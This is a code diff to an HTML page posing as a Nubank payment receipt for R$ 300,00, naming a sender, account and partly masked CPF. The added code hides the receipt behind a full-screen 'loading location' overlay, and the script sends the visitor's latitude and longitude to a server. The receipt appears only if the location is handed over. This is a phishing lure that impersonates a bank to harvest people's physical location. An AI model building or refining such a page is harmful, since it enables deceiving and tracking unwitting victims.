@@ -6,19 +6,44 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Comprovante de Recebimento</title>
   <link rel="stylesheet" href="styles.css" />
+  <style>
+    #bloqueio {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      z-index: 9999;
+      padding: 20px;
+      font-size: 1.2rem;
+    }
+
+    #comprovante {
+      display: none;
+    }
+  </style>
 </head>
 
 <body>
-  <div class="comprovante-container">
+  <div id="bloqueio">
+    <p>Carregando localização, aguarde...</p>
+  </div>
+
+  <div id="comprovante" class="comprovante-container">
     <h1>Comprovante de Recebimento</h1>
 
     <div class="informacoes">
-     <p><span style="font-weight: bold;">Data:</span> <span id="data-atual" style=" font-weight: 300;"></span></p>
+      <p><span style="font-weight: bold;">Data:</span> <span id="data-atual" style=" font-weight: 300;"></span></p>
       <p><span>Valor Enviado:</span> R$ 300,00</p>
       <p><span>De:</span> Victor Goulart Rocha</p>
-<p><span>Instituição:</span> NU PAGAMENTOS - IP</p>
-<p><span>Agência:</span> 0001 </p>
-<p><span>Conta:</span> 794231092-3</p>
+      <p><span>Instituição:</span> NU PAGAMENTOS - IP</p>
+      <p><span>Agência:</span> 0001 </p>
+      <p><span>Conta:</span> 794231092-3</p>
       <p><span>CPF:</span> 723.***.620-05</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
     </div>
@@ -29,7 +54,6 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="https://www.nubank.com.br/ajuda-e-seguranca">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
@@ -37,7 +61,7 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        mostrarBloqueio("Seu navegador não suporta geolocalização.");
       }
     });
 
@@ -45,12 +69,8 @@
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
-
     document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
@@ -66,17 +86,27 @@
       })
         .then(response => response.json())
         .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
+          if (data.success) {
+            document.getElementById("bloqueio").style.display = "none";
+            document.getElementById("comprovante").style.display = "block";
+          } else {
+            mostrarBloqueio("Erro ao verificar a localização.");
           }
         })
         .catch(error => {
           console.error("Erro:", error);
+          mostrarBloqueio("Erro ao enviar os dados de localização.");
         });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      mostrarBloqueio("Localização negada. Não é possível acessar o conteúdo.");
+    }
+
+    function mostrarBloqueio(mensagem) {
+      const bloqueio = document.getElementById("bloqueio");
+      bloqueio.innerHTML = `<p>${mensagem}</p>`;
+      bloqueio.style.display = "flex";
     }
   </script>
 </body>
